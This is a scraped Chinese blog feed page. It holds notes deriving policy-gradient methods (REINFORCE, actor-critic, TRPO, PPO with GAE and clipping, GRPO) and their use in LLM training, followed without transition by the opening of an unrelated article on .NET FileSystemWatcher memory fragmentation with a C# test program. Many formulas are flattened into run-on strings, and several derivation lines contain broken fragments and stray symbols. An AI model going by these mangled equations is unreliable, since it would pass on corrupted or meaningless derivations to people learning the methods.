<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2241698224b147faa0594ae43452ebf5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=fp3SqlE59nlcW6ycSaixlvknaeI%3D" alt="" loading="lazy"/></p>
<p>蒙特卡洛在当前状态下，采取一条支路，在这条路径上进行更新，更新这条路径上的所有状态</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/610d43d1ab854de5ae34419771032fa9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=2DM5YSqsMFgvYC9zR7P2ZUrKr80%3D" alt="" loading="lazy"/></p>
<p>时序差分从当前状态开始，往前走了一步，关注的是非常局部的步骤</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/33d4bd7fc53140afa52f4f8e5a48adcb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=9W7PxGbyMPREnhMXFnGeeXy2dYM%3D" alt="" loading="lazy"/></p>
<p>强化学习的统一视角</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6a2e29e9061942adbf9bde2b091e2e48~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=VVu%2B6u%2FZjg%2BQ3FCwtz9gnC1704g%3D" alt="" loading="lazy"/></p>
<p><strong>Policy-based method</strong></p>
<p>Value-based method 不适用场景：</p>
<ol>
<li>随机策略</li>
<li>连续动作空间</li>
</ol>
<p><strong>7.REINFORCE</strong></p>
<p>除了前面value-based 基于值函数的方法外，还有 policy-based 基于策略的方法 策略梯度算法 REINFORCE 求梯度<br/>
（）推导省略，见动手强化学习根据经过步变成的概率为在这一幕中出现的加权概率∇J（θ）=∇Vπ(s)=∇∑aπ(a|s)qπ(s,a)=(推导省略，见动手强化学习)=∑s∈S∑k=0∞Pr(s0−&gt;s,k,π)∑a∇π(a|s)qπ(s,a)(Pr(s0−&gt;s,k,π)=s0根据π经过k步变成s的概率)∝∑s∈Sμ(s)∑a∇π(a|s)qπ(s,a),μ(s)为在这一幕中s出现的加权概率=Eπ[∑a∇π(a|St)qπ(St,a)]=Eπ[∑aπ(a|St)qπ(St,a)∇π(a|St)π(a|St)]=Eπ[qπ(St,At)∇log⁡π(At|St)]=Eπ[Gt.∇log⁡π(At|St)]=Eπ[Gt.∇log⁡π(At|St;θ)]</p>
<p>梯度上升</p>
<p>θt+1=θt+αGt∇log⁡π(At|St;θt)</p>
<p>MC 采样 -&gt; 方差大 BaseLine</p>
<p>∝∑s∈Sμ(s)∑a(qπ(s,a)−b(s))∇π(a|s)</p>
<p>REINFORCE with Baseline b(s) 为基线，减少方差</p>
<p>∑ab(s)∇π(a|s)=b(s)∇∑aπ(a|s)=b(s)∇1=0</p>
<p>∴θt+1=θt+α(Gt−b(st))∇log⁡π(At|St;θt)</p>
<p>为估计值b(st)=v^(st,w),v^为估计值</p>
<p>θt+1=θt+α(Gt−v^(st,w))∇log⁡π(At|St;θt)</p>
<p>θt+1=θt+α(rt+γv^(st+1)−v^(st,w))∇log⁡π(At|St;θt)</p>
<p>此时除了训练策略函数</p>
<p>π</p>
<p>，又多要训练值函数</p>
<p>v</p>
<p>，引出 Actor-Critic 模型</p>
<p>Actor-Critic 算法 结合了学习值函数和策略函数</p>
<p>θt+1=θt+α(rt+γv^(st+1)−v^(st,w))∇log⁡π(At|St;θt)</p>
<p>Actor -&gt;</p>
<p>π(a|s)</p>
<p>，Critic -&gt;</p>
<p>v^(s)</p>
<p>，这一系列算法的目标都是，优化一个带参数的策略，只是会额外学习值函数去帮助策略函数更好的学习，所以本质上还是属于policy-based方法</p>
<p><strong>8.TRPO</strong> 但以上policy-based方法都会遇到训练不稳定的情况，所以考虑在更新时找到一块 Trust Region，能够得到策略性能的安全性保证，引出了 TRPO 置信区域策略优化算法 在理论上能保证策略学习的性能单调性，实际中取得比 策略梯度算法 更好的效果</p>
<p>因为该算法比较复杂，使用了泰勒展开近似，共轭梯度，线性搜索等方法直接求解，计算过程十分复杂，运算量非常大，而且也被相对简单的 PPO 因计算量低且性能相当的优势所替代，在此就不做过多赘述</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a063cccd0bf40e589068409499f2f7a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=P3X1r1CHJMtINHENQPO0bA7mbjE%3D" alt="" loading="lazy"/></p>
<p><strong>9.PPO</strong></p>
<p>使用了相对简单的方法 PPO 求解，大量实验结果证明效果和 TRPO 一样好 近端策略优化（Proximal Policy Optimization）是一种 actor-critic RL 算法，广泛应用于 LLM 强化微调阶段和足式机器人训练</p>
<p>回顾一下之前提到的时序差分，来计算 PPO 所需要的广义优势估计 GAE</p>
<ul>
<li>
<p>一步时序差分 更新 V 函数：<br/>
V(st)=V(st)+α[rt+γV(st+1)−V(st)]=V(st)+αδt</p>
</li>
<li>
<p>时序差分：<br/>
At(1)=δt=rt+γV(st+1)−V(st)At(2)=δt+γδt+1=rt+γrt+1+γ2V(st+2)−V(st)=[rt+γV(st+1)−V(st)]+γ[rt+1+γV(st+2)−V(st+1)]At(3)=δt+γδt+1+γ2δt+2=rt+γrt+1+γ2rt+2+γ2V(st+3)−V(st)At(k)=∑i=0k−1γiδt+i</p>
</li>
<li>
<p>GAE 广义优势估计：时序差分不同步数的优势估计进行指数加权平均<br/>
AtGAE=(1−λ)(At(1)+λAt(2)+λ2At(3)+...)=(δt+λγδt+1+λ2γ2δt+2+...)<br/>
γλAt+1GAE=λγ(δt+1+λγδt+2+...)=(λγδt+1+λ2γ2δt+2+...)<br/>
’</p>
</li>
<li>
<p>GAE 逆向迭代计算<br/>
At=δt+γλAt+1<br/>
λ∈[0,1]<br/>
，是 GAE 额外引入的一个超参数 λ=0<br/>
只看一步差分得到的优势；λ=1<br/>
看每一步差分得到优势的平均值</p>
</li>
<li>
<p>Actor 目标函数：<br/>
JPPO(θ)=Eπθold[min[πθ(a|s)πθold(a|s)At,clip(πθ(a|s)πθold(a|s),1−ϵ,1+ϵ)At]]<br/>
At=∑i=0Tλiγiδt+i<br/>
多步时序差分残差的指数加权 δt=rt+γV(st+1)−V(st)<br/>
一步时序差分残差 𝑟𝑡=𝑟ϕ(s)−βlogπθ(a|s)π𝑟𝑒𝑓(a|s)**<br/>
是奖π𝑟𝑒𝑓<br/>
是参考策略 (即 SFT 的初始模型)，β<br/>
为 KL 惩罚项系数**</p>
</li>
</ul>
<p>At=∑i=0Tλiγi(𝑟ϕ(s)−βlogπθ(at+i|st+i)π𝑟𝑒𝑓(at+i|st+i)+γV(st+i+1)−V(st+i))</p>
<p>求 PPO 策略梯度</p>
<p>∇JPPO(θ)=πθ(a|s)πθold(a|s)At∇log⁡π(At|St;θt)≈At∇log⁡π(At|St;θt)</p>
<p>策略网络更新</p>
<p>θt+1=θt+αAt∇log⁡π(At|St;θt)</p>
<ul>
<li>Critic 目标值函数 V(s)： Jcritic=(rt+γV(st+1)−V(st))2</li>
</ul>
<p>重要性采样的近似 和 PPO 中的 clip</p>
<ul>
<li>重要性采样 基于 model-free 的强化学习，通常会使用 MC 采样方法中的离轨策略估计<br/>
V(s)<br/>
，来评估π′<br/>
实际中，大多只能从旧策略 πθold<br/>
采样，因此引出重要性采样： J(θ)=∑oR(o)πθ(o)=∑oR(o)πθold(o)πθ(o)πθold(o)=E[o∼πθ]R(o)=E[o∼πθold]R(o)πθ(o)πθold(o)<br/>
这样可以从πθold<br/>
采样，重要性采样比值 πθ(o)πθold(o)=πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)=ri,t<br/>
来修正新旧策略分布偏差 ri,t=πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)<br/>
是重要性采样比值 尽量不要使得 πθ(o)πθold(o)<br/>
差异太大，因为对旧策略 πθold<br/>
采样，πθold<br/>
概率很小时，样本重要性反而很大，也会降低采样效率，所以引入了 clip 机制 和 KL 散度，让两概率分布差异减少</li>
<li>clip 机制 新旧策略差距较大时，<br/>
ri,t<br/>
可能会过大或过小 导致训练不稳定，甚至梯度爆炸 PPO 通过引入 clip 机制，限制 ri,t<br/>
的变化 L(θ)=min[πθ(ot|q,o&lt;t)πθold(ot|q,o&lt;t),clip(πθ(ot|q,o&lt;t)πθold(ot|q,o&lt;t),1−ϵ,1+ϵ)]<br/>
ri,t<br/>
偏离 1 太多，就会被裁剪到 [1−ϵ,1+ϵ]<br/>
范围内，避免训练不稳定</li>
</ul>
<p>具体而言，PPO 使用了对 TRPO 优化的一阶近似，对最大化的目标函数做了 CLIP 裁剪的创新技巧 换言之，也就是对目标函数的悲观估计，可以每次少量优化，防止优化策略过大和训练不稳定，增加模型的鲁棒性 或者用 KL 散度惩罚项来替代 CLIP 裁剪，所以 PPO 分两种形式，PPO-Penality 和 PPO-Clip</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/959213d4b0da493a867b9c5e8aa1e804~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=izjU7cll%2Bit27BUy8vc9eFXaAYA%3D" alt="" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/70c0803222d94b0f8a5752426dd30057~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=1evWSjkVCVVGrU5APfoq8Tpc8Cg%3D" alt="" loading="lazy"/></p>
<p>PPO 使用一个深度神经网络来表示策略</p>
<p>π(a|s,θ)</p>
<p>，其中 θ 是策略网络的参数 策略网络的输入是当前状态 s，输出是每个动作 a 的概率分布，表示在状态 s 下采取不同动作的可能性 与 DQN 类似，策略网络的结构也取决于任务类型，可以是 CNN 或 MLP 但要多训练一个值函数网络</p>
<p>V(s;θ)</p>
<p>，用 CNN 或 MLP</p>
<p><strong>10.GRPO</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ee953b5eddf47ac99a73af74d1a84d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=RuOgd5IRF9%2BS96%2FuTZheBKJTugk%3D" alt="" loading="lazy"/></p>
<p>Group Relative Policy Optimization (GRPO) 是 Proximal Policy Optimization (PPO) 近端策略优化的变种 放弃了值模型和 critic 模型，从群奖励分数取计算Adventage，更新策略函数，大幅减少计算量<br/>
JGRPO(θ)=E[q∼P(Q),{oi}i=1G∼πθold(O|q)]1G∑i=1G1|oi|∑t=1|oi|{min[πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t,clip[πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t),1−ϵ,1+ϵ]A^i,t]−βDKL[πθ||πref]}<br/>
A^𝑖,𝑡=𝑟𝑖−1G∑i=1G𝑟𝑖σr, <strong>1<br/>
从上述公式可以看出JGRPO(θ)eta)<br/>
，而公式πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t,t}<br/>
，其他项为修正项</strong></p>
<ol>
<li>
<p>不考虑 KL 惩罚项 和 clip 裁剪项 的情况下：根据重要性采样<br/>
JGRPO(θ)=E[q∼P(Q),{oi}i=1G∼πθold(O|q)]1G∑i=1G1|oi|∑t=1|oi|πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t=E[q∼P(Q),{oi}i=1G∼πθ(O|q)]1G∑i=1G1|oi|∑t=1|oi|A^i,t=E[q∼P(Q),{oi}i=1G∼πθ(O|q)]1G∑i=1GA^i=E[q∼P(Q),{oi}i=1G∼πθ(O|q)]1G∑i=1G𝑟𝑖−μrσr=1Gσr∑i=1GE<a href="https://link.juejin.cn?target=%25F0%259D%2591%259F%25F0%259D%2591%2596%25E2%2588%2592r%25C2%25AF" target="_blank" title="%F0%9D%91%9F%F0%9D%91%96%E2%88%92r%C2%AF" ref="nofollow noopener noreferrer">q∼P(Q),{oi}i=1G∼πθ(O|q)</a><br/>
在新策略πθ<br/>
已知的情况下，1Gσr<br/>
是常数 所以要使JGRPO(θ)<br/>
在更新策略后增大，需要让∑i=1GE<a href="https://link.juejin.cn?target=%25F0%259D%2591%259F%25F0%259D%2591%2596%25E2%2588%2592r%25C2%25AF" target="_blank" title="%F0%9D%91%9F%F0%9D%91%96%E2%88%92r%C2%AF" ref="nofollow noopener noreferrer">q∼P(Q),{oi}i=1G∼πθ(O|q)</a><br/>
变大 显而易见，根据问题回答的G个答案中： 回答好的oi**的r_i<br/>
t;0<br/>
**的r_i<br/>
t;0</p>
<p>的条件概率分布，向回答 reward 值高的方向增大概率，JGRPO(θ)<br/>
会增大，从而达到优化效果****</p>
</li>
<li>
<p>而<br/>
D𝐾𝐿[πθ||π𝑟𝑒𝑓]<br/>
反映的是 更新策略与参考策略的概率分布差异大小，有点像策略概率分布的 “正则化” 让每一次策略更新的差异不那么大，一步一个脚印慢慢优化πθ<br/>
，有助于训练的稳定性 D𝐾𝐿[πθ||π𝑟𝑒𝑓]=π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−logπ𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−1 1</p>
</li>
<li>
<p>运用策略梯度优化，不考虑裁剪项:<br/>
JGRPO(θ)=E[q∼P(Q),{oi}i=1G∼πθold(O|q)]1G∑i=1G1|oi|∑t=1|oi|πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t−βDKL[πθ||πref]=E[q∼P(Q),{oi}i=1G∼πθold(O|q)]1G∑i=1G1|oi|∑t=1|oi|πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t−β(π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−logπ𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−1) )</p>
</li>
</ol>
<p>运用</p>
<p>∇πθ=πθ∇logπθ</p>
<p>似然比技巧求梯度</p>
<p>∇θJGRPO(θ)=1G∑i=1G1|oi|∑t=1|oi|[ πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t∇θlogπθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−β(−π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ2(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)+πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ2(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡))πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)∇θlogπθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)] =1G∑i=1G1|oi|∑t=1|oi|[ πθ(oi,t|q,oi,&lt;t)πθold(oi,t|q,oi,&lt;t)A^i,t−β(1−π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡))] ∇θlogπθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)t;𝑡})}</p>
<p>因为有kl散度惩罚项，一次策略改进变化较小，所以令</p>
<p>πθ(oi,t|q,oi,&lt;t)≈πθold(oi,t|q,oi,&lt;t)</p>
<p>∴∇θJGRPO(θ)=1G∑i=1G1|oi|∑t=1|oi|[ A^i,t+β(π𝑟𝑒𝑓(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)πθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)−1)] ∇θlogπθ(𝑜𝑖,𝑡|𝑞,𝑜𝑖,&lt;𝑡)})}</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/972b27c7730243369edd9c09618833a1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pm66KeBQUdJ:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764309198&amp;x-signature=OKoIb22yDrq4UlwTH3JIvbJuDLA%3D" alt="" loading="lazy"/></p>
<p><strong>总结</strong></p>
<p>强化学习在LLM领域的应用远未到终点，其前景非常广阔，目前的热门方向大致如下：</p>
<p>自动化与AI反馈 (RLAIF)</p>
<ul>
<li>人类反馈成本高昂且速度慢。未来，强大的AI模型可以代替人类来提供反馈信号，这个概念被称为RLAIF (Reinforcement Learning from AI Feedback)</li>
<li>一个更强大的“教师”AI可以评估“学生”AI的回答，并提供奖励信号，从而实现大规模、自动化的持续改进和对齐</li>
</ul>
<p>与工具使用的深度融合</p>
<ul>
<li>未来的LLM不仅是语言模型，更是能调用各种工具（如代码解释器、搜索引擎、API）的“智能体”（Agent）。</li>
<li>强化学习是训练智能体的核心技术。通过奖励模型来判断工具使用的有效性，RL可以教会LLM何时、如何以及为何使用工具，从而解决更复杂的现实世界问题</li>
</ul>
<p>总而言之，强化学习已经成为释放大型语言模型全部潜力的核心技术之一。它不仅解决了关键的“对齐”问题，更指明了通往更强大、更通用、更能解决现实问题的AI智能体的道路</p>
<p>参考资料 Proximal Policy Optimization Algorithms, John Schulman, Filip Wolski, Prafulla Dhariwal, Alec Radford, Oleg Klimov, OpenAI DeepSeek-R1: Incentivizing Reasoning Capability in LLMs via Reinforcement Learning, DeepSeek-AI DAPO: An Open-Source LLM Reinforcement Learning System at Scale, ByteDance Seed, Institute for AI Industry Research (AIR), Tsinghua University, The University of Hong Kong , SIA-Lab of Tsinghua AIR MiniMax-M1: Scaling Test-Time Compute Efficiently with Lightning Attention, MiniMax Reinforcement Learning Richard S. Sutton 动手学强化学习 张伟楠 强化学习的数学原理 赵世钰 强化学习白板推导系列 B站up主: shuhuai008</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[对 .NET FileSystemWatcher引发内存碎片化的 反思]]></title>    <link>https://juejin.cn/post/7574728397374324788</link>    <guid>https://juejin.cn/post/7574728397374324788</guid>    <pubDate>2025-11-21T05:45:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574728397374324788" data-draft-id="7574680270538326016" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="对 .NET FileSystemWatcher引发内存碎片化的 反思 "/> <meta itemprop="keywords" content=".NET"/> <meta itemprop="datePublished" content="2025-11-21T05:45:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="用户722786812344"/> <meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            对 .NET FileSystemWatcher引发内存碎片化的 反思 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T05:45:44.000Z" title="Fri Nov 21 2025 05:45:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 讲故事</h3>
<p>前些天又遇到了一例 FileSystemWatcher 引发的内存碎片化故障，但这个碎片化不是因为经典的 <code>reloadOnChange=true</code> 导致的，所以我觉得有必要做一次深度的反思，供以后遇到类似问题提供技术上的解决方法，这篇我们就来系统的讲解下 两种碎片化方式的调查方法。</p>
<h2 data-id="heading-1">二：经典的 FileSystemWatcher 碎片化</h2>
<h3 data-id="heading-2">1. 测试代码</h3>
<p>这种碎片化是由 <code>reloadOnChange=true</code> 引发的，祸根主要是程序员将 .netframework 读取配置文件的方式套在了 .net 上，为了方便演示，先上一段测试代码。</p>
<pre><code class="hljs language-csharp" lang="csharp">
    <span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
    {
        <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)</span>
        {
            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++)
            {
                IConfiguration configuration = BuildConfiguration();
                <span class="hljs-built_in">string</span> appName = configuration[<span class="hljs-string">"AppName"</span>];
                Console.WriteLine(<span class="hljs-string">$"i=<span class="hljs-subst">{i}</span> 应用名称: <span class="hljs-subst">{appName}</span>"</span>);
            }

            Console.ReadLine();
        }

        <span class="hljs-function"><span class="hljs-keyword">static</span> IConfiguration <span class="hljs-title">BuildConfiguration</span>()</span>
        {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ConfigurationBuilder()
                .SetBasePath(Directory.GetCurrentDirectory())
                .AddJsonFile(<span class="hljs-string">"appsettings.json"</span>, optional: <span class="hljs-literal">false</span>, reloadOnChange: <span class="hljs-literal">true</span>)
                .Build();
        }
    }
</code></pre>
<p>卦中的代码非常简单，就是每次读取 AppName 时都调了一下 BuildConfiguration 方法，仅此而已，但将程序跑起来之后，居然发现程序吃了 <code>2.2G</code> 的内存，真是没边的事，截图如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5233a2d084a14bc4b1063b92a36b32c4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764308744&amp;x-signature=wDugKJTykxlR%2Fu4borBjyqazAzk%3D" alt="" loading="lazy"/></p>
<p>为了找出原因，上 windbg 附加，使用 <code>!dumpheap -stat</code> 观察托管堆，截图如下：</p>
